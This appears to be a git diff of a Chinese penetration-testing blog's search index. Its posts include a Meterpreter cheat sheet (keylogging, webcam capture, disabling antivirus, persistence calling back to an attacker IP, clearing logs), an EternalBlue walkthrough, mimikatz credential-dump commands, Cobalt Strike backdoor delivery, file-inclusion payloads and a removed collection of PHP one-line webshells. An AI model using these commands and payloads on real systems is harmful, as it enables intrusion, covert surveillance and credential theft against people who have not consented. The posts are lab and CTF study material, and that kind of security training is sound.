+upload /root/pl1.exe C:/Users/zm/Downloads      		#将/root/pl1.exe上传到目标机的 C:/Users/zm/Downloads 目录下
+getpid             										#查看当前Meterpreter Shell的进程PID
+migrate 1384        									#将当前Meterpreter Shell的进程迁移到PID为1384的进程上
+idletime           		 								#查看主机运行时间
+getuid              									#查看获取的当前权限
+getsystem           									#提权,获得的当前用户是administrator才能成功
+run  killav        			 							#关闭杀毒软件
+screenshot          									#截图
+webcam_list         									#查看目标主机的摄像头
+webcam_snap         									#拍照
+webcam_stream       									#开视频
+execute 参数 -f 可执行文件   							    #执行可执行程序
+run getgui -u test1 -p Abc123456    					#创建test1用户，密码为Abc123456
+run getgui -e                							#开启远程桌面
+keyscan_start                							#开启键盘记录功能
+keyscan_dump                			 				#显示捕捉到的键盘记录信息
+keyscan_stop                 							#停止键盘记录功能
+uictl  disable  keyboard     							#禁止目标使用键盘
+uictl  enable   keyboard     							#允许目标使用键盘
+uictl  disable  mouse        							#禁止目标使用鼠标
+uictl  enable   mouse        							#允许目标使用鼠标
+load                        							#使用扩展库
+run				             							#使用扩展库
+run post/windows/wlan/wlan_profile                      #用于读取目标主机WiFi密码
+run exploit/windows/local/persistence lhost=X.X.X.X     #实现永久加载木马
+run exploit/windows/local/persistence lhost=192.168.100.132 lport=8888        #会自动连接192.168.100.132的8888端口，缺点是容易被杀毒软件查杀
+portfwd add -l 9999 -r 192.168.100.158 -p 3389     		                      #将192.168.11.13的3389端口转发到本地的9999端口上，这里的192.168.100.158是获取权限的主机的ip地址
+clearev                                                 #清除日志
+</code></pre>
+<p>16、进入shell输入<code>systeminfo</code>查看目标主机信息<br><img src="/posts/1051313787/14.png"><br><br></p>
+<h2 id="利用-ms17-010（永恒之蓝）攻击"><a href="#利用-ms17-010（永恒之蓝）攻击" class="headerlink" title="利用 ms17_010（永恒之蓝）攻击"></a>利用 ms17_010（永恒之蓝）攻击</h2><p>17、在kali终端输入msfconsole进入Metasploit<br><img src="/posts/1051313787/15.png"><br><br></p>
+<p>18、搜索ms17_010漏洞，找到四个模块，前两个是漏洞利用模块，后两个是辅助模块<br><img src="/posts/1051313787/16.png"><br><br></p>
+<p>19、输入use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010(或者输入use 3)使用Auxiliary辅助探测模块对漏洞进行探测；<br>输入show options查看这个模块需要配置的信息<br><img src="/posts/1051313787/17.png"><br><br></p>
+<p>20、设定好扫描192.168.225.100到192.168.225.200<br><code>注：RHOSTS 参数是要探测主机的ip或ip范围，我们探测一个ip范围内的主机是否存在漏洞</code><br>发现192.168.225.136主机存在永恒之蓝漏洞（我先前打开了一个有该漏洞的虚拟机在同一网段）<br><img src="/posts/1051313787/18.png"></p>
+<p><img src="/posts/1051313787/19.png"></p>
+<p><img src="/posts/1051313787/20.png"><br><br></p>
+<p>21、使用exploit模块漏洞进行攻击<br><img src="/posts/1051313787/21.png"><br><br></p>
+<p>22、设置攻击载荷和必要参数，输入exploit进行攻击，攻击成功！<br><img src="/posts/1051313787/22.png"></p>
+<p><img src="/posts/1051313787/23.png"><br><br></p>
+<p>23、输入getuid查看当前权限，得知当前是最高权限<br><img src="/posts/1051313787/24.png"><br><br></p>
+<p>24、接下来是后渗透阶段，尝试上传文件到目标主机：upload 本机路径 上传目标路径<br>上传成功，到目标主机里查看文件确认。<br><img src="/posts/1051313787/25.png"></p>
+<p><img src="/posts/1051313787/26.png"><br><br></p>
+<p>25、非常重要的一步：<strong>实现永久加载木马</strong><code>run exploit/windows/local/persistence lhost=X.X.X.X</code><br><img src="/posts/1051313787/29.png"><br><br></p>
+<h2 id="kiwi模块"><a href="#kiwi模块" class="headerlink" title="kiwi模块"></a>kiwi模块</h2><p>kiwi模块要在system权限下才能使用：<br>    creds_all：列举所有凭据<br>    creds_kerberos：列举所有kerberos凭据<br>    creds_msv：列举所有msv凭据<br>    creds_ssp：列举所有ssp凭据<br>    creds_tspkg：列举所有tspkg凭据<br>    creds_wdigest：列举所有wdigest凭据<br>    dcsync：通过DCSync检索用户帐户信息<br>    dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID<br>    golden_ticket_create：创建黄金票据<br>    kerberos_ticket_list：列举kerberos票据<br>    kerberos_ticket_purge：清除kerberos票据<br>    kerberos_ticket_use：使用kerberos票据<br>    kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令<br>    lsa_dump_sam：dump出lsa的SAM<br>    lsa_dump_secrets：dump出lsa的密文<br>    password_change：修改密码<br>    wifi_list：列出当前用户的wifi配置文件<br>    wifi_list_shared：列出共享wifi配置文件&#x2F;编码</p>
 ]]></content>
       <categories>
-        <category>web漏洞</category>
+        <category>web攻防</category>
       </categories>
       <tags>
         <tag>web攻防</tag>
-        <tag>web漏洞</tag>
+        <tag>工具使用</tag>
       </tags>
   </entry>
   <entry>
@@ -752,6 +795,33 @@ clearev                                                 #清除日志
 <p>6、在powershell里执行文件可以看到kali的监听器已经发现了本机<br><img src="/posts/2497940050/14.png"></p>
 <p>7、将window的病毒实时查杀打开后，再打开未进行混淆的pay.ps1，发现该文件已经被window杀掉了。<br><img src="/posts/2497940050/15.png"></p>
 <p>8、而进行混淆后的pay111.ps1还可以运行。<br><img src="/posts/2497940050/16.png"><br><br></p>
+]]></content>
+      <categories>
+        <category>web攻防</category>
+      </categories>
+      <tags>
+        <tag>web攻防</tag>
+        <tag>工具使用</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Cobaltstrike网络共享后门</title>
+    <url>/posts/3343148988.html</url>
+    <content><![CDATA[<h2 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h2><span id="more"></span>
+
+<p>1、查看kali虚拟机的IP，打开cobalt strike 进行连接<br><img src="/posts/3343148988/1.png"><br><br></p>
+<p>2、把生成的后门exe文件放到root下<br><img src="/posts/3343148988/2.png"><br><br></p>
+<p>3、输入以下命令以开启python服务，在kali里打开浏览器输入“127.0.0.1：端口号”或者“kali的IP ： 端口号”，验证网站是否能打开并存在后门文件。<br><img src="/posts/3343148988/3.png"><br><br></p>
+<p>4、在本机上打开网站并下载文件（先把病毒查杀关闭）<br><img src="/posts/3343148988/4.png"><br><br></p>
+<p>5、下载打开后可以在kali里看到已经有一个监视窗口了，我们可以对其进行操作<br><img src="/posts/3343148988/5.png"></p>
+<p><img src="/posts/3343148988/6.png"><br><br></p>
+<p>6、输入以下命令开启apache服务，在etc&#x2F;apache2&#x2F;ports.conf 里查看启用的端口号<br><img src="/posts/3343148988/7.png"><br><br></p>
+<p>7、输入 “IP地址：端口号” 就可以看到服务已经成功启动了<br><img src="/posts/3343148988/8.png"><br><br></p>
+<p>8、将var&#x2F;www&#x2F;html内的index.html 移除，把后门文件复制到文件夹内，打开网站后可以看到文件的存在。<br><img src="/posts/3343148988/9.png"><br><br></p>
+<h2 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h2><p>1、在cobalt strike内打开文件托管<br><img src="/posts/3343148988/10.png"><br><br></p>
+<p>2、输入相应的信息，运行文件托管，成功后复制URL到本机浏览器打开<br><img src="/posts/3343148988/11.png"></p>
+<p><img src="/posts/3343148988/12.png"><br><br></p>
+<p>3、下载文件后将文件后缀改回exe即可运行并连接cobalt strike。<br><img src="/posts/3343148988/13.png"></p>
 ]]></content>
       <categories>
         <category>web攻防</category>
@@ -791,104 +861,25 @@ clearev                                                 #清除日志
       </tags>
   </entry>
   <entry>
-    <title>next主题边框圆角化</title>
-    <url>/posts/47864.html</url>
-    <content><![CDATA[<h1 id="next主题边框完全圆角化"><a href="#next主题边框完全圆角化" class="headerlink" title="next主题边框完全圆角化"></a>next主题边框完全圆角化</h1><p>问题描述：next主题边框圆角化后作者所属的边框有一层阴影，圆角化不明显</p>
+    <title>window 2003搭建web服务器</title>
+    <url>/posts/3309922375.html</url>
+    <content><![CDATA[<h2 id="window-server-2003-enterprise-edition下载"><a href="#window-server-2003-enterprise-edition下载" class="headerlink" title="window server 2003 enterprise edition下载"></a>window server 2003 enterprise edition下载</h2><p>百度网盘链接：<a href="https://pan.baidu.com/s/1R3Q-cf9n0t1MqKaF7WBWGA?pwd=5mia">https://pan.baidu.com/s/1R3Q-cf9n0t1MqKaF7WBWGA?pwd=5mia</a><br>提取码：5mia</p>
 <span id="more"></span>
-<h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><p>打开文件 “&#x2F;themes&#x2F;next&#x2F;source&#x2F;css&#x2F;_variables&#x2F;Gemini.styl”，<br>在</p>
-<pre><code>// Settings for some of the most global styles.
-// --------------------------------------------------
-// $body-bg-color           = #eee;
-$body-bg-color           = transparent;
-
-// Borders.
-// --------------------------------------------------
-$box-shadow-inner        = 0 2px 2px 0 rgba(0, 0, 0, .12), 0 3px 1px -2px rgba(0, 0, 0, .06), 0 1px 5px 0 rgba(0, 0, 0, .12);
-$box-shadow              = 0 2px 2px 0 rgba(0, 0, 0, .12), 0 3px 1px -2px rgba(0, 0,   0, .06), 0 1px 5px 0 rgba(0, 0, 0, .12), 0 -1px .5px 0 rgba(0, 0, 0, .09);
-</code></pre>
-<p>中将 <code>$body-bg-color</code> 赋值为透明 transparent</p>
+<h2 id="搭建步骤"><a href="#搭建步骤" class="headerlink" title="搭建步骤"></a>搭建步骤</h2><p>1、用vmware创建虚拟机，没什么值得注意的地方，正常安装就行</p>
+<p>2、安装好虚拟机后按步骤来<br><img src="/posts/3309922375/0.png"><br><img src="/posts/3309922375/1.png"><br><img src="/posts/3309922375/2.png"><br><img src="/posts/3309922375/3.png"><br><img src="/posts/3309922375/4.png"><br><img src="/posts/3309922375/5.png"><br><img src="/posts/3309922375/6.png"><br><img src="/posts/3309922375/7.png"><br><img src="/posts/3309922375/8.png"><br><br></p>
+<p>3、创建一个文件夹以放置文件，路径就是文件夹的路径<br><img src="/posts/3309922375/9.png"><br><img src="/posts/3309922375/10.png"><br><img src="/posts/3309922375/11.png"><br><img src="/posts/3309922375/12.png"><br><br></p>
+<p>4、打开test文件夹，创建一个index文本文件，随便输入并保存，记得把最后把后缀名改为html<br><img src="/posts/3309922375/16.png"><br><br></p>
+<p>5、右键test，把权限打开，防止网站无法访问，如果还是无法访问，那么把IIS管理器内web服务扩展里的权限也打开<br><img src="/posts/3309922375/17.png"><br><br></p>
+<p>6、可以看到网站已经可以打开了<br><img src="/posts/3309922375/18.png"><br><br></p>
+<p>7、一般我们使用win2003是为了用源码搭建靶场的，如果有源码在手，我们可以在第三步时就将路径设为源码的文件夹（注意：不是下图这里更改，这里只是作演示）<br><img src="/posts/3309922375/19.png"><br><br></p>
+<p>8、如果在访问网站时需要验证时,可以在用户组里创建一个用户以进行验证并访问网站(我已经验证过了所以没有弹出框可以截出来)<br><img src="/posts/3309922375/13.png"><br><img src="/posts/3309922375/14.png"><br><img src="/posts/3309922375/15.png"></p>
 ]]></content>
       <categories>
-        <category>hexo</category>
-      </categories>
-      <tags>
-        <tag>hexo</tag>
-        <tag>next</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>next主题顶部黑边处理</title>
-    <url>/posts/937.html</url>
-    <content><![CDATA[<h1 id="next主题顶部黑边处理"><a href="#next主题顶部黑边处理" class="headerlink" title="next主题顶部黑边处理"></a>next主题顶部黑边处理</h1><p>问题描述：next主题优化后仍然有一条黑边在顶部出现</p>
-<span id="more"></span>
-<h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>打开文件 “themes\next\layout_layout.swig” ,在 </p>
-<pre><code>&lt;body itemscope itemtype=&quot;http://schema.org/WebPage&quot;&gt;
-  &lt;div class=&quot;container&#123;%- if theme.motion.enable %&#125; use-motion&#123;%- endif %&#125;&quot;&gt;
-    &lt;div class=&quot;headband&quot;&gt;&lt;/div&gt;
-</code></pre>
-<p>中删除 “<code>&lt;div class=&quot;headband&quot;&gt;&lt;/div&gt;</code>”</p>
-<h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>打开文件 “themes\next\source\css_variables\base.styl” ，<br>在</p>
-<pre><code>// Headband
-// --------------------------------------------------
-$headband-height                = 3px;
-$headband-bg                    = $black-deep;
-</code></pre>
-<p>中找到“<code>$headband-height</code>”，把3px改成0px；</p>
-]]></content>
-      <categories>
-        <category>hexo</category>
-      </categories>
-      <tags>
-        <tag>hexo</tag>
-        <tag>next</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件包含漏洞</title>
-    <url>/posts/1082777166.html</url>
-    <content><![CDATA[<h2 id="文件包含概述"><a href="#文件包含概述" class="headerlink" title="文件包含概述"></a>文件包含概述</h2><p>文件包含漏洞是一种常见的 Web 应用程序安全漏洞，是代码注入的一种。它的本质是允许攻击者通过利用应用程序中存在的文件包含功能，向服务器提交恶意代码并执行。文件包含漏洞的发生通常与开发人员未对用户提供的文件路径进行足够验证和过滤有关。  </p>
-<span id="more"></span>
-
-<p>以PHP为例,常用的文件包含函数有以下四种：<br><strong>require()</strong>:找不到被包含的文件会产生致命错误，并停止脚本运行<br><strong>include()</strong>:找不到被包含的文件只会产生警告，脚本继续执行<br>**require_once()**与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含<br>**include_once()**与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含<br><br></p>
-<h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><p>常见伪协议：</p>
-<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">file:</span><span class="comment">// — 访问本地文件系统</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line"><span class="symbol">ftp:</span><span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line"><span class="symbol">php:</span><span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line"><span class="symbol">zlib:</span><span class="comment">// — 压缩流</span></span><br><span class="line"><span class="symbol">data:</span><span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line"><span class="symbol">glob:</span><span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line"><span class="symbol">phar:</span><span class="comment">// — PHP 归档</span></span><br><span class="line"><span class="symbol">ssh2:</span><span class="comment">// — Secure Shell 2</span></span><br><span class="line"><span class="symbol">rar:</span><span class="comment">// — RAR</span></span><br><span class="line"><span class="symbol">ogg:</span><span class="comment">// — 音频流</span></span><br><span class="line"><span class="symbol">expect:</span><span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure>
-
-<p>关于php:&#x2F;&#x2F;filter ，可以参考<code>https://www.anquanke.com/post/id/202510#h3-9</code>  ，写的很详细<br><br></p>
-<h2 id="本地文件包含漏洞（LFI）"><a href="#本地文件包含漏洞（LFI）" class="headerlink" title="本地文件包含漏洞（LFI）"></a>本地文件包含漏洞（LFI）</h2><p>当一个Web应用程序接收到用户输入并将其作为文件路径来包含文件时，如果没有进行适当的验证和清理，就可能被攻击者利用来访问或包含服务器上的其他文件。</p>
-<p>一些常见的敏感目录信息路径:<br><strong>Windows系统:</strong></p>
-<p>C:\boot.ini &#x2F;&#x2F;查看系统版本<br>C:\windows\system32\inetsrv\MetaBase.xml &#x2F;&#x2F;IIS配置文件<br>C:\windows\repair\sam &#x2F;&#x2F;存储Windows系统初次安装的密码<br>C:\ProgramFiles\mysql\my.ini &#x2F;&#x2F;Mysql配置<br>C:\ProgramFiles\mysql\data\mysql\user.MYD &#x2F;&#x2F;MySQL root密码<br>C:\windows\php.ini &#x2F;&#x2F;php配置信息  </p>
-<p><strong>Linux&#x2F;Unix系统:</strong><br>&#x2F;etc&#x2F;password &#x2F;&#x2F;账户信息<br>&#x2F;etc&#x2F;shadow &#x2F;&#x2F;账户密码信息<br>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;Apache2默认配置文件<br>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F;虚拟网站配置<br>&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F;PHP相关配置<br>&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;Apache配置文件<br>&#x2F;etc&#x2F;my.conf &#x2F;&#x2F;mysql配置文件  </p>
-<p>文件包含一般会指定后缀，这样我们就需要截断来绕过。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span> . <span class="string">&quot;html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>在PHP5.2.x中我们可以通过使用%00来截断后面的内容、也可以使用路径长度截断，不过都在php5.3中被修复了。</p>
-<p>payload：</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/test.php?name=D:\phpstudy\PHPTutorial\MySQL\my.ini%<span class="number">00</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>利用字符.或者&#x2F;.或者.&#x2F;来截断。系统文件路径长度限制：<code>windows 259个bytes</code>  <code>linux 4096个bytes</code>。</p>
-<p><strong>1、日志文件利用</strong><br>当无法包含文件，或者找不到文件上传入口时，可以考虑利用日志文件</p>
-<br>
-
-<h2 id="远程文件包含漏洞（RFI）"><a href="#远程文件包含漏洞（RFI）" class="headerlink" title="远程文件包含漏洞（RFI）"></a>远程文件包含漏洞（RFI）</h2><p>远程文件包含漏洞允许攻击者通过构造特定的URL或请求参数，使得服务器尝试加载一个远程控制的文件。这通常涉及到PHP的include或require语句，这些语句可以用来包含外部文件。如果这些语句没有得到适当的限制，攻击者就可以利用它们来包含恶意文件，如webshell，这是一种可以远程执行命令的脚本。</p>
-<p>RFI存在的前提是在php.ini中配置<code>allow_url_include</code>、 <code>allow_url_fopen</code>为on。</p>
-<p>对于RFI，我们可以使用?截断，不受版本限制：</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">127.0.0.1</span>/test.php?name=http://<span class="number">127.0.0.1</span>/<span class="number">1</span>.txt?</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<h2 id="CTF例题"><a href="#CTF例题" class="headerlink" title="CTF例题"></a>CTF例题</h2><p>攻防世界—泰山杯-简单的文件包含<br>1、源码如下:<br><img src="/posts/1082777166/1.png"></p>
-<p>2、输入<br><code>http://61.147.171.105:54882/?filename=php://filter/convert.base64-encode/resource=check.php</code> 回显do not hack ,说明在check.php内对代码进行了过滤(使用string.rot13过滤器也不行)<br><img src="/posts/1082777166/2.png"></p>
-<p>3、只能逐个尝试过滤器,过滤器详情可以参考<br><code>https://blog.csdn.net/qq_44657899/article/details/109300335</code><br>这里尝试使用convert.iconv*,得知使用了正确的过滤器,但是应该是字符编码不符合<br><img src="/posts/1082777166/3.png"></p>
-<p>4、于是使用burpsuite抓包对字符编码进行爆破,常见的字符编码如下(不全):</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">UCS</span>-<span class="number">4</span>*</span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">4</span>BE</span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">4</span>LE*</span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">2</span></span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">2</span>BE</span><br><span class="line"><span class="attribute">UCS</span>-<span class="number">2</span>LE</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">32</span>*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">32</span>BE*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">32</span>LE*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">16</span>*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">16</span>BE*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">16</span>LE*</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">7</span></span><br><span class="line"><span class="attribute">UTF7</span>-IMAP</span><br><span class="line"><span class="attribute">UTF</span>-<span class="number">8</span>*</span><br><span class="line"><span class="attribute">ASCII</span>*</span><br><span class="line"><span class="attribute">EUC</span>-JP*</span><br><span class="line"><span class="attribute">SJIS</span>*</span><br><span class="line"><span class="attribute">eucJP</span>-win*</span><br><span class="line"><span class="attribute">SJIS</span>-win*</span><br><span class="line"><span class="attribute">ISO</span>-<span class="number">2022</span>-JP</span><br><span class="line"><span class="attribute">ISO</span>-<span class="number">2022</span>-JP-MS</span><br><span class="line"><span class="attribute">CP932</span></span><br><span class="line"><span class="attribute">CP51932</span></span><br><span class="line"><span class="attribute">BASE64</span></span><br></pre></td></tr></table></figure>
-<p><img src="/posts/1082777166/4.png"></p>
-<p>5、得知有5种组合方式是有正常回显的,查看响应包,得到check.php的具体内容<br><img src="/posts/1082777166/5.png"></p>
-<p>6、我们选择EUC-JP<em>和UCS-4</em>作为字符编码,构造payload:<br><code>http://61.147.171.105:54882/?filename=php://filter/convert.iconv.EUC-JP*.UCS-4*/resource=check.php</code> ,然后将check.php 改成 flag.php 即可得到flag<br><img src="/posts/1082777166/6.png"></p>
-]]></content>
-      <categories>
-        <category>web漏洞</category>
+        <category>web攻防</category>
       </categories>
       <tags>
         <tag>web攻防</tag>
-        <tag>web漏洞</tag>
+        <tag>靶场</tag>
       </tags>
   </entry>
   <entry>
@@ -1016,82 +1007,109 @@ $headband-bg                    = $black-deep;
       </tags>
   </entry>
   <entry>
-    <title>文件上传漏洞</title>
-    <url>/posts/154257042.html</url>
-    <content><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。</p>
+    <title>next主题边框圆角化</title>
+    <url>/posts/47864.html</url>
+    <content><![CDATA[<h1 id="next主题边框完全圆角化"><a href="#next主题边框完全圆角化" class="headerlink" title="next主题边框完全圆角化"></a>next主题边框完全圆角化</h1><p>问题描述：next主题边框圆角化后作者所属的边框有一层阴影，圆角化不明显</p>
 <span id="more"></span>
-<p><strong>一句话木马大全：</strong>(搬运自<a href="https://blog.csdn.net/qq_43390703/article/details/104858705">https://blog.csdn.net/qq_43390703/article/details/104858705</a>)</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">##PHP：</span></span><br><span class="line">注意：限制内容长度时可以将GIF89a换成BM，木马写成<span class="meta">&lt;?=</span>`tac /f*`;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;r00ts&#x27;</span>]);<span class="meta">?&gt;</span> </span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[cmd]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">assert</span>(<span class="variable">$_REQUEST</span>[cmd]); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="comment">//?cmd=phpinfo() @preg_replace(&quot;/abc/e&quot;,$_REQUEST[&#x27;cmd&#x27;],&quot;abcd&quot;); ?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//?cmd=phpinfo();</span></span><br><span class="line"><span class="variable">$func</span> =<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="variable">$func</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//?func=system&amp;cmd=whoami</span></span><br><span class="line"><span class="variable">$func</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$cmd</span>;</span><br><span class="line"><span class="variable">$new_array</span>=<span class="title function_ invoke__">array_map</span>(<span class="variable">$func</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="comment">//print_r($new_array);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//?cmd=phpinfo()</span></span><br><span class="line">@<span class="title function_ invoke__">call_user_func</span>(assert,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//?cmd=phpinfo()</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$cmd</span>;</span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&quot;assert&quot;</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//?func=system&amp;cmd=whoami</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array1</span>=<span class="keyword">array</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$func</span> =<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">array_filter</span>(<span class="variable">$array1</span>,<span class="variable">$func</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">usort</span>(<span class="variable">$_GET</span>,<span class="string">&#x27;asse&#x27;</span>.<span class="string">&#x27;rt&#x27;</span>);<span class="meta">?&gt;</span> php环境&gt;=&lt;<span class="number">5.6</span>才能用</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">usort</span>(...<span class="variable">$_GET</span>);<span class="meta">?&gt;</span>  php环境&gt;=<span class="number">5.6</span>才能用</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST1</span>);<span class="meta">?&gt;</span> </span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]);&#125;<span class="meta">?&gt;</span> </span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_REQUEST1</span>);<span class="meta">?&gt;</span> </span><br><span class="line"><span class="meta">&lt;?php</span> (<span class="variable">$_</span>=@<span class="variable">$_GET1</span>).@<span class="variable">$_</span>(<span class="variable">$_POST1</span>)<span class="meta">?&gt;</span> </span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">eval_r</span>(<span class="variable">$_POST1</span>)<span class="meta">?&gt;</span> </span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="title function_ invoke__">eval_r</span>(<span class="variable">$_POST1</span>)<span class="meta">?&gt;</span><span class="comment">//容错代码 </span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">assert</span>(<span class="variable">$_POST1</span>);<span class="meta">?&gt;</span><span class="comment">//使用Lanker一句话客户端的专家模式执行相关的PHP语句 </span></span><br><span class="line"><span class="meta">&lt;?</span><span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;cc&#x27;</span>]);<span class="meta">?&gt;</span> </span><br><span class="line"><span class="meta">&lt;?</span><span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&#x27;cc&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;cc&#x27;</span>])<span class="meta">?&gt;</span> </span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[email]/e&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;h&#x27;</span>],<span class="string">&quot;error&quot;</span>);<span class="meta">?&gt;</span><span class="comment">/*使用这个后,使用菜刀一句话客户端在配置连接的时候在&quot;配置&quot;一栏输入*/</span>:&lt;O&gt;h=@<span class="title function_ invoke__">eval_r</span>(<span class="variable">$_POST1</span>);&lt;/O&gt; </span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> `<span class="variable">$_GET</span>[<span 